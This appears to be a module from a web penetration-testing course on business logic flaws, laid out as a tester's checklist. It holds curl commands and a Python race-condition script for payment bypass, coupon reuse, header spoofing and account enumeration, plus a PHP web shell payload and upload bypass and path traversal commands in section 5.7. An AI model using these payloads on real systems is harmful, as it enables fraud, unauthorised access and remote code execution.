# Module: Business Logic Testing
## Logic Flaws, Workflow Bypasses, and Race Conditions

---

## 5.1 Understanding Business Logic Flaws

Business logic vulnerabilities arise from **correct code implementing flawed design**. Unlike injection attacks, these cannot be found by automated scanners alone. They require understanding the application's intended workflow.

**Key Questions to Ask:**
- What does this application allow users to do?
- What should it prevent users from doing?
- What happens if steps are performed out of order?
- What happens with unexpected input values?
- What happens if the same action is repeated?

---

## 5.2 Price and Value Manipulation

### Negative Values
```http
POST /cart/update HTTP/1.1
{"item_id": "123", "quantity": -1}
```
Expected result: Cart is updated. Unexpected result: Store credits you money.

### Zero Price Manipulation
```http
POST /checkout HTTP/1.1
{"item_id": "456", "price": 0}
{"item_id": "456", "price": 0.001}
```

### Currency Manipulation
```http
POST /payment HTTP/1.1
{"amount": 100, "currency": "IDR"}
# If the server expects USD but doesn't validate currency, charge in lower-value currency
```

### Coupon Stacking / Reuse
```
1. Apply coupon code once — note discount applied
2. Remove coupon, re-apply same code — does it reapply?
3. Apply same coupon in multiple parallel requests (race condition)
4. Try expired coupon codes
5. Try coupon codes from other user accounts
```

---

## 5.3 Workflow Bypass

### Step-Skipping Attack
```
Normal flow: Step 1 → Step 2 → Step 3 → Step 4 (complete)
Attack:       Step 1 → Step 4 (skip verification steps)
```

```bash
# After step 1, directly navigate to final step URL
curl "https://target.com/checkout/confirm" \
  -H "Cookie: session=USER_SESSION"

# Common bypass targets:
# /checkout/payment → /checkout/confirm
# /verify-email → /dashboard
# /2fa-verify → /account
# /terms-accept → /complete-registration
```

### Payment Flow Bypass
```
1. Add item to cart
2. Proceed to checkout
3. Intercept payment confirmation request
4. Modify payment status to "success"
5. Check if order is fulfilled without actual payment
```

---

## 5.4 Race Conditions

### Use Case: One-Time Coupon
```python
# Concurrent requests to apply the same one-time coupon
import threading
import requests

SESSION = "your-session-cookie"
URL = "https://target.com/apply-coupon"
DATA = {"code": "ONETIME50"}

def apply_coupon():
    r = requests.post(URL, json=DATA, cookies={"session": SESSION})
    print(f"Status: {r.status_code} | Response: {r.text[:100]}")

threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Use Case: Single-Use Invite Link
```bash
# Send 10 concurrent requests to use the same invite token
# Use Burp Suite Repeater → Send to Turbo Intruder
# Or use GNU Parallel:
seq 1 20 | parallel -j 20 \
  curl -s -X POST https://target.com/use-invite \
  -d "token=INV-SINGLEUSE123" \
  -H "Cookie: session=SESSION" -w "%{http_code}\n"
```

---

## 5.5 Account Enumeration via Business Logic

```bash
# Registration endpoint — does it reveal if email exists?
curl -s -X POST "https://target.com/register" \
  -d "email=known@target.com&password=Test123!" | grep -i "already"

# Password reset — different response for known vs unknown email?
curl -s -X POST "https://target.com/forgot-password" \
  -d "email=unknown@target.com"

curl -s -X POST "https://target.com/forgot-password" \
  -d "email=admin@target.com"

# Compare response bodies and times
```

---

## 5.6 Trust Boundary Issues

### HTTP Header Trust
```bash
# Some apps trust X-Internal-User or X-Admin headers from clients
curl "https://target.com/api/admin" \
  -H "X-Internal-User: true" \
  -H "X-Admin: true" \
  -H "X-Role: admin"
```

### Parameter Pollution in Business Logic
```
# If app uses first value:
POST /pay?amount=1&amount=1000

# If app uses last value:
POST /pay?amount=1000&amount=1
```

---

## 5.7 File Upload Logic Flaws

### Extension Bypass
```bash
# Upload PHP webshell with disguised extension
# Attempt: file.php, file.php5, file.phtml, file.phar
# file.php.jpg, file.php%00.jpg, file.php.
# file.PhP, FILE.PHP

curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;filename=shell.php.jpg;type=image/jpeg" \
  -H "Cookie: session=USER_SESSION"
```

### Polyglot File Upload
```bash
# A file that is both a valid image AND valid PHP
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" legitimate.jpg -o polyglot.jpg
mv polyglot.jpg shell.php.jpg
```

### Path Traversal in Filename
```bash
curl -X POST "https://target.com/upload" \
  -F "file=@payload.php;filename=../../../../var/www/html/shell.php" \
  -H "Cookie: session=USER_SESSION"
```

---

## Business Logic Checklist

- [ ] Negative value manipulation (quantities, prices)
- [ ] Zero value manipulation
- [ ] Workflow step-skip attack
- [ ] Payment bypass (status manipulation)
- [ ] Coupon code reuse / stacking
- [ ] Race condition on one-time tokens
- [ ] Race condition on limited inventory
- [ ] Account enumeration via registration/reset
- [ ] Trust header exploitation
- [ ] HTTP parameter pollution in business logic
- [ ] File upload extension bypass
- [ ] File upload path traversal
- [ ] Polyglot file upload
- [ ] Business-critical API logic testing
